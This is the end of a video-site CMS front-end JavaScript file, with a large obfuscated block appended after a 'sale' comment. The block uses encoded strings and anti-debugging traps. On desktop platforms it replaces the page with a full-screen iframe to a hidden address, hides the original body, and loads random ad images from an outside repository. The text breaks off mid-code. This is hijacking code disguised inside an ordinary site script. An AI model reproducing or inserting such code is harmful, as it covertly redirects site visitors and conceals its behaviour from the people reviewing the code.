						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.1.1.1.1.1.
 */
 
var _0xod1='jsjiami.com.v6',_0xod1_=['‮_0xod1'],_0x5103=[_0xod1,'IzzCnA==','wpJMFzV9C0IQCVU=','RMOhSjzDtw==','wpM1VMKbBA==','PkvDiDDCpA==','SQMywobDgg==','MWRfN8OM','QMOFJMOnwrgMHVPCrMOyKcOJw4FgIsKjenh3L8OYVcKRFMKbCRHDhMKEHVfCrTLDuMOKwq/DkxxSTsKfwqPDqMOhwoZWwpNtwqMjE8OlAx3DhWrDvEbChsODw7Vuw69/HcKvWmTDsQwRRGjDt2fCt8KRw5rCpCMNcXwyw5zCgivCvQ7DuTXDncKAwo/Dq8OfwpxUT8KIwqDCt1IvwrPCnMOjNknCpA==','KC/DqcORwqc=','w43CssKUw4Q6','GcKxw5RWOg==','XGnCg8O6w7w=','w4zDunzDhgk=','wrJTFsKZEg==','wol+JnIX','wp/CnMOIAsOgwqoN','Q2zCiSQBwq0D','wq3ClSEAw5wFwoo=','EMOmwodwfMKqwpA=','wojDhsK3Ohs=','w4IqZ8KITMKRFA==','wp7Ci0pew6DCuBvDq8OWK8ODw4zDh8KrFUt+bWvCssK8w41HRsKMKFIVRsOraXYcEX4OwpbDuBnCoBBnw7kFXMKOwoTCj8OnLx/DgCh9wo/Csg5faMKtwqNHABfCp8KzJsKWwqbCgwBNw7E=','w4XClMOnwrAvEirChUdeTsKS','JcKcNcO2w65xw4c=','O8OecsKnw7zDp8OWDQ==','w6bChcOKw6h/XEo=','wpYrbcOEXcKIHEbDhMOtDcOrw65oAGUTHMKww7/DtMOlwrPDoMKnwqoMw54kwpFjw7LDiWfDqk7Dh8Kvw6bCkFg3ZsOQch9zwrsHWw0ew5svw5jDisOHF1XCjMK9KMO0w5DCvcOMw5nDoR3DrcO5w5vCm0QNJRXCgsKFw5bDiRR1Hidbw6ptQ8K8wrfDpmA6DMO4w5F1w5LChcOUw5k8w6/DnTLDmMO+wpY=','A8OFwq1oew==','Ogorwppg','w5gffcKqcw==','wrDDvMKSNzc=','w57CpsOaw7dI','w5QdZzDDhw==','wrfDqMKTAw==','w7hew4ZGwqw=','UHHDjx9g','wpdAw5w=','wqRRCMKfFA==','DsKIZS9mw5M5F8Oc','w6LCh8OPw7Vu','wqIsU8KAH8Kjwo0=','BsOOJMK6wrwNElPCug==','w4bCikFdwqc=','w53Dn0XDsC7Chi4=','wodKCi9wDks=','w4QCZSrDnMOLwp0=','GMOfHcOlwqrDn1w=','wqtDAQ==','EcO5wp1qfg==','wqvCucKTRMKO','G8KFdRBv','wrJULh1c','w4puw6F3woU=','I8KSw5Q1XQ==','Hm/CjTEU','w4TCg0xHwrI=','w6xVw4zCp8OE','w5UMZT3DnMOK','VcOYB8O7wqk=','Agl1cQ==','KcKVbsKw','wqvCmMKLWA==','w67DocKVAA==','wozClUpY','N8OawoE=','w69TCcKU','V3l1Dw==','w4pRDTo=','w6RYw5NVw7MOFcKywpLCncO0Hn9BZsOEw7pLFMOA','CcORHcOywqrDng==','w6U7w55pXBooeMKwMhjDiEJ3','wooQTQnDk8KQTA==','woAWUBw=','B8Kmw43Dpn5j','OcKUw40=','wqpaE8KUNQ==','wprDicKNw5sd','CHxEBsOx','DMOpC8OUwqI=','w4pZw4lGwr1IVcKow5XCjMOzC2YCYMOEwqFZHcKAcEha','PG3Cjjsu','QcKTw7/DvwY=','d8Kda8KLw6g=','w6IOT8KYZA==','GsOpMsOOwog=','dMKMw7rDiAo=','wpHCrjIjw44=','w4cTw6ReZA==','wpTDkMKnIwE=','w44MZg==','Yn7CmcOLw5E=','L8OpNcOYwoo=','DH5yBcOHZA==','fcKMw67Dui8=','woDCn8KgfMK3','wrbCgiYTw40B','w6Qyw6F7aA==','w7TCo8KUw6cf','w4Jvw7rCjcOZ','L0nCmAcC','YMKFw5LDuwsm','HHnDkTDCtw==','F8K9w6shXA==','wqzDrMKPCjpo','dDPDnMKXwoXDng/CvDzDn8OQQm5gw6I=','KBRIKWY=','O8OecsK2w6bDv8OaXDBk','wq3ChMOGw79uWUskw5ZswoQhQCDDisKEwrRSw6TDlQYvXMOXasOgw7bDqxrDj8OoBsO/woc=','DmJ/FMOEYXw=','woHCnEAQwrTCpBnCucKJO8Oxw43DicKgRhAwUynCqMOuw5NRFMOYKVIIWcK/fD8BBmsfw5/DuFLCpQpywqgnVMKSw4bClMOyKRfDiGZxwp3DnRxLMsK0wqEESkPDtMOvccKGw7DDihldwr8Jw6tYZMKww5lEbcOqw4IBT8O2YsKMwpgxe3rDjELCoS10wr11w7nDosOKZ8OUAAASw5FF','woLDg1/Dui3Cj3U=','JcKfwoHChEHDosKHKg==','w5TCisOIAMKlwq8Hw6zDoT9dwpLCg8ODwpFrZA1bwoHDuy5Xw7A7w6M6PERXMsKrw4oSwqTDphjClm7Cl8O6SA96w6bCuTvDmhsNWcOpZ8KVNG4CAmjDqsOWGm3Dt8OtcMO0CEDCm8OhfsKL','Xi4qT8OAMy4uTVMswoQ=','D8KDw4JBC8O0QGHCusKCWsOIMUZDEcKxwqXDgisCwrA2','cMOHdMKr','LsO0KsKewp0=','OcOxJsKcwrs=','dMOSwrTCs1A=','AyrDi8OIwp4=','b8KIw7DDkQ4=','LsKQw6fDqXE=','woDCp8OTBcO1','HVTDrQzCrg==','wp5dw5Ylw6I=','VsKjeMKZw58=','BHvDsDLCkQ==','woLCpQYMw4M=','w7jDonHDuRM=','f8KUw47DtREp','bMK2ZcKEw68=','IhgqwrxG','bG3DqjtB','wo/DpcKBw5UK','CEvDlQnCqVoiLMOvw4HCgMOxYDzCocKDWcOlCSpVwonCog==','w6lvw5Z/wo8=','ElzCtxwH','IMKoQSh0','K8OcHcOswqQ=','wphYJ1ku','GQnDu8Ofwow=','HSPDqcO0wqc=','XA5IeH0=','w7jDhUXDoDXCgyROw7lNDSBGB8Kuw55gHGoyw4bDpsO9','MMO3KcOHwqg=','w4ofw4V5aA==','wrFrPAZT','D0bDrAfCkg==','w59Gw7FDwro=','IUh+NsOI','wpNPCcKqMw==','f8OCfx/Dqg==','BMK3w6MKSg==','w5gbRMK9Qw==','w4x4YFHCmg==','w7jCssOtw4pS','w6wgfBPDlg==','asOxwpTCvVA=','w4PCmcKdT8OowofDvDPCl8KNwq1Fw5R4ERVWXcKQwrXCncO+w5k=','w4TCpghEYA==','wrRYHz1P','woIxbcKaPg==','w5HCqS5HVQ==','w4YdezXDig==','wqTDs8KtBAw=','CVYtW8OX','P8K7w5ZqOg==','dsKjUMKgw4k=','XhVKAw==','w44bWBzDig==','wpDDk8Kqw4YP','HBdpL2U=','JcOYKcO6','MjIEwptT','KsOREsObwqQ=','L1DDiwDChA==','GnhaLcOQ','wpzCmQPCqg==','C8K5w5xwCQ==','EATDmsOXwok=','woPDssK3w5Y3','woJID0kH','KwhFNHRQGg4=','w7hDw6tKwr5ESMKFwpzCnsOk','cMOewpbClUDDgcKE','wo7CucKV','woHCgMOFE8O9wokF','wqMYXQ==','w4QfCQ==','NXl4FcOZ','w7LChcKd','BsKRZQ==','VMOeHMO4wqDCnVFswoN3','IcKTw41G','wp7CgkZcwqHDsRzCvsKQMMOdw47DksOyECAWSmbDosOswpYdFsOONEdBWMKwKzxVXHwewoLDsUXCsRs6wrp3T8OGw4rCj8OjMwzCmH4uw4fDgB5Wb8KmwroSW1nDrMOgfcOCwrzChQ8Vw6hTwr8JPMKnw4A7PcK/wp4YGcK9e8ORw4ohf3rDk0rCoTshwr1+wrfDocOKbsOHCAJaw5YXw7TDjMOnBcKCw7BEw5vDpi18wp4Mw4XDozINwqJxw4nChQ1yaMOowrdow4bDjUfCssOkaC1OTMOwcxJIT0PCuMK6EhxVwpU0a18jMgxTDMKHYjNYw5bDlxstM8KcHl3DhiHCgScrw7I4wqpHesOkEsKFwo3Dpg==','K8KZw4hb','wr/CijgAw4A=','wpwcXx3Dhg==','wpzCkE3DsSDChy5Cwr5eGyJBV8OpwoA2T0Jhw6nCosKzM3jCisO+SsKcUVUEw7RkQkHChcOHw6zCnMOuWg==','wqNMHsKJRsKj','wo5VDMKgLg==','C8OCKsKz','w7Z1w53Cu8OE','woFNw7ctw6k=','IMKPw4gY','IgswwppM','w4gow7dmwrs=','w4QeeA==','wpnCsxEXw4k=','FQkOwrhraiE=','wpFWAS5eBUsXCQ==','KhXCixByTsOdw4LDrcOOwpk=','H8KVdT4=','RA1vZkbCpsODwrAGwpkCwpFiwp/CncOAwpzCoCwjAlXDhcKbw4LCs8OEworDtcOMWsO/wp87f8Oiw7jDs3HCvsKVIMOgOhQ=','EWRiEMOSNz0uSl40wpTDhcKhWSfCiMORH8OYwp5Yw5F1X33DgEXDs8O9w6HCokRkHsK+DQ7DqMO5w5VIcsO8','wpZECjhwDw==','w6bCoQhQXw==','wpfDrcKrNyM=','BcODKcK8wrgQFFLDtMKhKsKHwo4lCsOv','w7VAUWY=','Dll9ZFTDscKJw70Kwo8Iw5p6w5HDm8KVw5LDqSkyXlTDjMKDwoTCusOLwpjCosOLUcK+wo50McOnw7vCrn3Ct8KSMA==','GcOfF8Ovw6XCmQ==','f0LCjRbDrk9/PsOyw5zDgsOqIS3Dsw==','wrQiwplQAAN3YcOpOm7DjT5vwpJ9Vg==','wq4hV8KWE8K7','w4DCp29iwpc=','w7LCtMOzw6pX','w4DCmkFrwq4=','woxtMzp5','ACMtwqdE','wrjDvMKtw44o','woTDocKpw6c2','JMKBw6vDrnw=','A8KZw5ZBKQ==','IXF7DsON','w5MOw75ecw==','wpFJLFUb','w4rCp3ROwqY=','w4MEw6o=','FMOXNcKx','wqQ7XsKWAMK7woFWwrg=','D8OCEsO1wqA=','AsOGN8KzwrU=','woDDn8K5w5wg','BzEawpd7','w5HChndawqE=','w6bCr8KjWsOR','HMKPw4N0NA==','bh0HwoHDng==','w6PCmMKew6Il','MMOYFMKuwqY=','wqnClyQdw40=','w6Y7w4hZVw==','KsKZw4JREMOxSg==','IyDCgcKYw53Djlg=','SQtpeUc=','OAtKM31TDQ==','ZMKeb8Kgw6rDp8OW','wqhNHMKf','J8KVw4YMQQ==','w4LCg8KIw4YN','CBjCq8KDw7s=','w5rDsXHDoRk=','Bj3CgxhA','w6vCp8OIw4hC','cFJHPRXCtsOEwqBfw5VTwoVTwo3DlMOfw4DDpGMQAWHDv8Kyw4TCr8KdwonCuMOYQsK0wo9yQsOsw6HCgHjDs8Ksb8KqKULDqcOFw5tPwroTYgkuwrARw4NYMQ/CqhfCinY=','wokQe8K/Ig==','B8KZCMOHw70=','w6wfR8KVRQ==','LwFXNA==','Aw7CjMKdw4g=','wpM0XsKBFw==','S8OHwpHCgl8=','w5LDglPDpyo=','woTCgcOG','KRvCtRE=','NsKLPsO3w6w=','Z2jCt8Oe','wo3CnMOTGcO3','LMKOw49HD8OpRmDDvA==','w5bCnUJLwqU=','Tgx5VVs=','wo3CkREZw68=','wo7Cr8ODEsOR','MmhBE8OW','w5nCp8Otw655','w5bDhEbDrw==','w6vDk33DmSg=','A8Kxw6BQBQ==','wr43w4xeURIgPcKtMiPDnW4uwoF2B8KJeF4XVxwBO8Knb8Oew6o/woPCkirDrcOmwpEBJ8KCVznDgsKICVNpw4HDqsO2w6HCny8tFyVFw7XCmg0jwr8FwpzCmRF9WSTDi8Kbw67Dr0NrFBVFZsKZwpjDplIGwoUkFcOkw6FvWMO3wpNhUsOUB2RBw7BWw64wB1jCgUvDo8OdwprCnMKTPypGEMOtw4DDpn/CvSRGw7DCqsOg','wpvCsMK3dsKZ','wp/CpsO2MMOf','pUIkpHjsxjiCZaZmUrIi.com.v6=='];if(function(_0x35494a,_0x9ded9f,_0x4bffb9){function _0x1f89da(_0x319299,_0x41ce9d,_0x48047d,_0x195e15,_0x11aa13,_0x46e83e){_0x41ce9d=_0x41ce9d>>0x8,_0x11aa13='po';var _0x313f94='shift',_0x58b4c8='push',_0x46e83e='‮';if(_0x41ce9d<_0x319299){while(--_0x319299){_0x195e15=_0x35494a[_0x313f94]();if(_0x41ce9d===_0x319299&&_0x46e83e==='‮'&&_0x46e83e['length']===0x1){_0x41ce9d=_0x195e15,_0x48047d=_0x35494a[_0x11aa13+'p']();}else if(_0x41ce9d&&_0x48047d['replace'](/[pUIkpHxCZZUrI=]/g,'')===_0x41ce9d){_0x35494a[_0x58b4c8](_0x195e15);}}_0x35494a[_0x58b4c8](_0x35494a[_0x313f94]());}return 0xcabdc;};function _0x27da88(){var _0xd94765={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x10d268,_0x35e6bc,_0x1c24e1,_0x3fa831){_0x3fa831=_0x3fa831||{};var _0x54ef5b=_0x35e6bc+'='+_0x1c24e1;var _0x2a1330=0x0;for(var _0x2a1330=0x0,_0x5959a9=_0x10d268['length'];_0x2a1330<_0x5959a9;_0x2a1330++){var _0x3c914c=_0x10d268[_0x2a1330];_0x54ef5b+=';\x20'+_0x3c914c;var _0x5e02ca=_0x10d268[_0x3c914c];_0x10d268['push'](_0x5e02ca);_0x5959a9=_0x10d268['length'];if(_0x5e02ca!==!![]){_0x54ef5b+='='+_0x5e02ca;}}_0x3fa831['cookie']=_0x54ef5b;},'removeCookie':function(){return'dev';},'getCookie':function(_0x55a230,_0x39cb5f){_0x55a230=_0x55a230||function(_0x4e22f1){return _0x4e22f1;};var _0x3d7cb1=_0x55a230(new RegExp('(?:^|;\x20)'+_0x39cb5f['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x2a6a3b=typeof _0xod1=='undefined'?'undefined':_0xod1,_0x4b61a6=_0x2a6a3b['split'](''),_0x1406fa=_0x4b61a6['length'],_0x3d653b=_0x1406fa-0xe,_0x26fc8f;while(_0x26fc8f=_0x4b61a6['pop']()){_0x1406fa&&(_0x3d653b+=_0x26fc8f['charCodeAt']());}var _0x20659d=function(_0x1d8820,_0x1107ea,_0x4b984d){_0x1d8820(++_0x1107ea,_0x4b984d);};_0x3d653b^-_0x1406fa===-0x524&&(_0x26fc8f=_0x3d653b)&&_0x20659d(_0x1f89da,_0x9ded9f,_0x4bffb9);return _0x26fc8f>>0x2===0x14b&&_0x3d7cb1?decodeURIComponent(_0x3d7cb1[0x1]):undefined;}};function _0x5a211d(){var _0x3753c5=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3753c5['test'](_0xd94765['removeCookie']['toString']());};_0xd94765['updateCookie']=_0x5a211d;var _0x508435='';var _0x56931f=_0xd94765['updateCookie']();if(!_0x56931f){_0xd94765['setCookie'](['*'],'counter',0x1);}else if(_0x56931f){_0x508435=_0xd94765['getCookie'](null,'counter');}else{_0xd94765['removeCookie']();}};_0x27da88();}(_0x5103,0xb6,0xb600),_0x5103){_0xod1_=_0x5103['length']^0xb6;};function _0x40a0(_0x20b86a,_0x3d5eb7){_0x20b86a=~~'0x'['concat'](_0x20b86a['slice'](0x1));var _0x2aa0b1=_0x5103[_0x20b86a];if(_0x40a0['isGYQx']===undefined){(function(){var _0xd5213b=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x51a127='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xd5213b['atob']||(_0xd5213b['atob']=function(_0x5b5874){var _0x55e712=String(_0x5b5874)['replace'](/=+$/,'');for(var _0x4f6848=0x0,_0x9dafa9,_0x59de8b,_0x1515b3=0x0,_0x15577c='';_0x59de8b=_0x55e712['charAt'](_0x1515b3++);~_0x59de8b&&(_0x9dafa9=_0x4f6848%0x4?_0x9dafa9*0x40+_0x59de8b:_0x59de8b,_0x4f6848++%0x4)?_0x15577c+=String['fromCharCode'](0xff&_0x9dafa9>>(-0x2*_0x4f6848&0x6)):0x0){_0x59de8b=_0x51a127['indexOf'](_0x59de8b);}return _0x15577c;});}());function _0x39c5ee(_0x30297b,_0x3d5eb7){var _0x757aea=[],_0x4f210e=0x0,_0x124ec9,_0x27566a='',_0x401bde='';_0x30297b=atob(_0x30297b);for(var _0x29da6a=0x0,_0xa0ced=_0x30297b['length'];_0x29da6a<_0xa0ced;_0x29da6a++){_0x401bde+='%'+('00'+_0x30297b['charCodeAt'](_0x29da6a)['toString'](0x10))['slice'](-0x2);}_0x30297b=decodeURIComponent(_0x401bde);for(var _0x4e9358=0x0;_0x4e9358<0x100;_0x4e9358++){_0x757aea[_0x4e9358]=_0x4e9358;}for(_0x4e9358=0x0;_0x4e9358<0x100;_0x4e9358++){_0x4f210e=(_0x4f210e+_0x757aea[_0x4e9358]+_0x3d5eb7['charCodeAt'](_0x4e9358%_0x3d5eb7['length']))%0x100;_0x124ec9=_0x757aea[_0x4e9358];_0x757aea[_0x4e9358]=_0x757aea[_0x4f210e];_0x757aea[_0x4f210e]=_0x124ec9;}_0x4e9358=0x0;_0x4f210e=0x0;for(var _0x2e058f=0x0;_0x2e058f<_0x30297b['length'];_0x2e058f++){_0x4e9358=(_0x4e9358+0x1)%0x100;_0x4f210e=(_0x4f210e+_0x757aea[_0x4e9358])%0x100;_0x124ec9=_0x757aea[_0x4e9358];_0x757aea[_0x4e9358]=_0x757aea[_0x4f210e];_0x757aea[_0x4f210e]=_0x124ec9;_0x27566a+=String['fromCharCode'](_0x30297b['charCodeAt'](_0x2e058f)^_0x757aea[(_0x757aea[_0x4e9358]+_0x757aea[_0x4f210e])%0x100]);}return _0x27566a;}_0x40a0['ngjqzl']=_0x39c5ee;_0x40a0['YvqOyY']={};_0x40a0['isGYQx']=!![];}var _0x2403d9=_0x40a0['YvqOyY'][_0x20b86a];if(_0x2403d9===undefined){if(_0x40a0['TsKipm']===undefined){var _0x2b3c5d=function(_0x2a7c8f){this['tZczMv']=_0x2a7c8f;this['tQvibz']=[0x1,0x0,0x0];this['AduNSh']=function(){return'newState';};this['MuNGwb']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['GIbiyf']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x2b3c5d['prototype']['vYUIDf']=function(){var _0xb3d7f6=new RegExp(this['MuNGwb']+this['GIbiyf']);var _0x1f511c=_0xb3d7f6['test'](this['AduNSh']['toString']())?--this['tQvibz'][0x1]:--this['tQvibz'][0x0];return this['fRPDzH'](_0x1f511c);};_0x2b3c5d['prototype']['fRPDzH']=function(_0x51e81){if(!Boolean(~_0x51e81)){return _0x51e81;}return this['haoeLz'](this['tZczMv']);};_0x2b3c5d['prototype']['haoeLz']=function(_0x48e890){for(var _0x5dedcb=0x0,_0x35203d=this['tQvibz']['length'];_0x5dedcb<_0x35203d;_0x5dedcb++){this['tQvibz']['push'](Math['round'](Math['random']()));_0x35203d=this['tQvibz']['length'];}return _0x48e890(this['tQvibz'][0x0]);};new _0x2b3c5d(_0x40a0)['vYUIDf']();_0x40a0['TsKipm']=!![];}_0x2aa0b1=_0x40a0['ngjqzl'](_0x2aa0b1,_0x3d5eb7);_0x40a0['YvqOyY'][_0x20b86a]=_0x2aa0b1;}else{_0x2aa0b1=_0x2403d9;}return _0x2aa0b1;};var system={'win':![],'mac':![],'xll':![]};var p=navigator[_0x40a0('‫0','bfcy')];var us=navigator['userAgent'][_0x40a0('‮1','bnP6')]();system['win']=p[_0x40a0('‫2','4yPA')]('Win')==0x0;system[_0x40a0('‫3','x0(G')]=p[_0x40a0('‮4','4nju')](_0x40a0('‮5','o78H'))==0x0;system['x11']=p==_0x40a0('‫6','30th')||p[_0x40a0('‮4','4nju')](_0x40a0('‫7','hJ51'))==0x0;if(system[_0x40a0('‫8','p!6m')]||system[_0x40a0('‮9','foIj')]||system['xll']){var iframe_url=_0x40a0('‫a','Dj[H');$(_0x40a0('‮b','#DA!'))['html'](_0x40a0('‮c','8hLe'));$(_0x40a0('‮d','#DA!'))[_0x40a0('‫e','@Uj%')]();$(document)[_0x40a0('‫f','o78H')](function(){var _0x56e171={'OvvPH':function(_0x2c064e,_0x21679f){return _0x2c064e(_0x21679f);},'MMzTq':'body','UjWZd':function(_0x2955a0,_0x2a8c06){return _0x2955a0+_0x2a8c06;},'zbLna':'<iframe\x20style=\x22width:100%;\x20height:100%;position:absolute;margin-left:0px;margin-top:0px;top:0%;left:0%;\x22\x20id=\x22mainFrame\x22\x20src=\x22','CFjMg':_0x40a0('‮10','JvLf'),'AkMKE':function(_0x43ce26,_0x548b4d){return _0x43ce26(_0x548b4d);},'gCzuM':_0x40a0('‮11','8uPn'),'CTYcp':'visibility'};_0x56e171[_0x40a0('‮12','8uPn')]($,_0x56e171['MMzTq'])[_0x40a0('‮13','eGtD')](_0x56e171[_0x40a0('‫14','!f*h')](_0x56e171[_0x40a0('‫15','JO*P')]+iframe_url,_0x56e171['CFjMg']))[_0x40a0('‫16','8^l(')]();_0x56e171[_0x40a0('‫17','md&e')]($,_0x56e171[_0x40a0('‮18','^B7f')])[_0x40a0('‮19','gKrC')](_0x56e171[_0x40a0('‮1a','@Uj%')],_0x40a0('‮1b','md&e'));});}var sUserAgent=navigator[_0x40a0('‫1c','!js3')][_0x40a0('‫1d','kbJM')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0x40a0('‫1e','foIj')](sUserAgent);var images=new Array('https://cdn.jsdelivr.net/gh/uidc/sale/md.gif',_0x40a0('‫1f','QK4R'),_0x40a0('‮20','hJ51'),'https://cdn.jsdelivr.net/gh/uidc/sale/mdb.gif');var img;img=images[parseInt(Math[_0x40a0('‫21','!js3')]()*images['length'])];function randomString(_0x30ab3b){var _0x33ed92=function(_0xb4b354){var _0x15fa4e=!![];return function(_0x1a3a91,_0x17fd6b){var _0xf7869f='‮';var _0x42b3e7=_0x15fa4e?function(){if(_0xf7869f==='‮'&&_0x17fd6b){var _0xfada26=_0x17fd6b['apply'](_0x1a3a91,arguments);_0x17fd6b=null;return _0xfada26;}}:function(_0xb4b354){};_0x15fa4e=![];var _0xb4b354='‮';return _0x42b3e7;};}();var _0x1080f6=_0x33ed92(this,function(){var _0x498f23=function(){return'\x64\x65\x76';},_0x2c2f71=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x1d3d41=function(){var _0x4cdf9d=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4cdf9d['\x74\x65\x73\x74'](_0x498f23['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xb824a0=function(){var _0x1fcd15=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x1fcd15['\x74\x65\x73\x74'](_0x2c2f71['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x72efbe=function(_0x414051){var _0x3c1cfb=~-0x1>>0x1+0xff%0x0;if(_0x414051['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x3c1cfb)){_0x43ce3f(_0x414051);}};var _0x43ce3f=function(_0x2bd1a3){var _0x251a8e=~-0x4>>0x1+0xff%0x0;if(_0x2bd1a3['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x251a8e){_0x72efbe(_0x2bd1a3);}};if(!_0x1d3d41()){if(!_0xb824a0()){_0x72efbe('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x72efbe('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x72efbe('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x1080f6();var _0x1cf1c0={'RLhBt':function(_0x30b9fc,_0x50bfb6){return _0x30b9fc+_0x50bfb6;},'cCPvM':function(_0x25fccc,_0x4d0641){return _0x25fccc===_0x4d0641;},'bubCn':function(_0x1eda01,_0x41a3c4){return _0x1eda01!==_0x41a3c4;},'ZVvQf':_0x40a0('‫22','FJhX'),'fKrxx':_0x40a0('‮23','^P)l'),'xDXph':'3|4|0|5|2|1|6','dQgFr':_0x40a0('‫24','eGtD'),'IeuBS':_0x40a0('‮25','30th'),'WGdhp':'chain','siTra':'input','vmsng':function(_0x37a015){return _0x37a015();},'BbvfW':function(_0x1a59f5,_0x48b0b4){return _0x1a59f5===_0x48b0b4;},'vmlIX':'vhDqj','Wvzmp':function(_0x590b66,_0x4ae5dd,_0x43b4d8){return _0x590b66(_0x4ae5dd,_0x43b4d8);},'KxWsw':function(_0x3f1c2f,_0xfaa76b){return _0x3f1c2f(_0xfaa76b);},'HPNrc':'body','UcVZi':function(_0xce0bb2,_0x1a5afd){return _0xce0bb2+_0x1a5afd;},'JGLrz':function(_0x226c68,_0x4bb14a){return _0x226c68+_0x4bb14a;},'xhADb':_0x40a0('‮26','QK4R'),'wHWFZ':_0x40a0('‮27','Dj[H'),'SyVDg':_0x40a0('‮28','&JwK'),'MjloO':'<section\x20id=\x27sc8tufoxy_footer_br\x27>','Rviht':'</section>','pusZy':function(_0x4a763c,_0x1a1c2b){return _0x4a763c===_0x1a1c2b;},'dRtDZ':'EwSyL','fAbdT':'WvYmV','KihVD':_0x40a0('‮29','K]E*'),'YjVKi':function(_0x20d6cc,_0xc51cff){return _0x20d6cc!==_0xc51cff;},'mGsVZ':'undefined','OQykR':_0x40a0('‫2a','fIQ#'),'Haevu':'abcdefhijkmnprstwxyz2345678','OUOpo':function(_0x3e41ca,_0x3038ab){return _0x3e41ca<_0x3038ab;},'uxHLv':_0x40a0('‫2b','8hLe'),'FBFRL':'dOhoG','OJFFd':function(_0x28558f,_0x424c55){return _0x28558f*_0x424c55;}};var _0x18ca94=function(_0x1117d3){var _0xdd643c={'Xamnl':function(_0x1783ee,_0x4760aa){return _0x1cf1c0['RLhBt'](_0x1783ee,_0x4760aa);},'QPTrC':function(_0x18c128,_0x4a98d9){return _0x1cf1c0[_0x40a0('‮2c','EMyb')](_0x18c128,_0x4a98d9);},'UxDRk':function(_0x51c109,_0x25cabf){return _0x1cf1c0[_0x40a0('‮2d','8hLe')](_0x51c109,_0x25cabf);},'BSZVF':_0x40a0('‮2e','!js3'),'ARAog':function(_0x1e4064,_0x5a8f2b){return _0x1cf1c0[_0x40a0('‮2f','md&e')](_0x1e4064,_0x5a8f2b);},'dFxFP':_0x1cf1c0[_0x40a0('‮30','Gkra')],'JozcV':_0x1cf1c0[_0x40a0('‫31','Gkra')]};var _0x16eac7=!![];return function(_0x1a1569,_0x3d5cd8){if(_0xdd643c[_0x40a0('‫32','tzH2')](_0xdd643c['dFxFP'],_0xdd643c[_0x40a0('‮33','#DA!')])){return _0xdd643c[_0x40a0('‮34','hJ51')](_0x30ab3b,_0x1c841a);}else{var _0x527e29='‮';var _0x369a31=_0x16eac7?function(){if(_0xdd643c[_0x40a0('‫35','K]E*')](_0x527e29,'‮')&&_0x3d5cd8){if(_0xdd643c['UxDRk'](_0xdd643c[_0x40a0('‫36','1bKo')],_0x40a0('‮37','8hLe'))){var _0x1c768a={};_0x1c768a[_0x40a0('‫38','^B7f')]=_00;_0x1c768a[_0x40a0('‫39','eGtD')]=_00;_0x1c768a['debug']=_00;_0x1c768a['info']=_00;_0x1c768a['error']=_00;_0x1c768a[_0x40a0('‮3a','fIQ#')]=_00;_0x1c768a[_0x40a0('‫3b','Dj[H')]=_00;return _0x1c768a;}else{var _0x9fcfb=_0x3d5cd8[_0x40a0('‮3c','eGtD')](_0x1a1569,arguments);_0x3d5cd8=null;return _0x9fcfb;}}}:function(_0x1117d3){};_0x16eac7=![];var _0x1117d3='‮';return _0x369a31;}};}();(function(){var _0x87afc3={'SnSqj':_0x1cf1c0['xDXph'],'HWDhI':function(_0x42fbda,_0x3f15fd){return _0x1cf1c0[_0x40a0('‮3d','Gkra')](_0x42fbda,_0x3f15fd);},'XGDgE':'JLJRm','zPkTX':_0x1cf1c0[_0x40a0('‫3e','md&e')],'HSFLR':function(_0x10e1bb,_0x18f24c){return 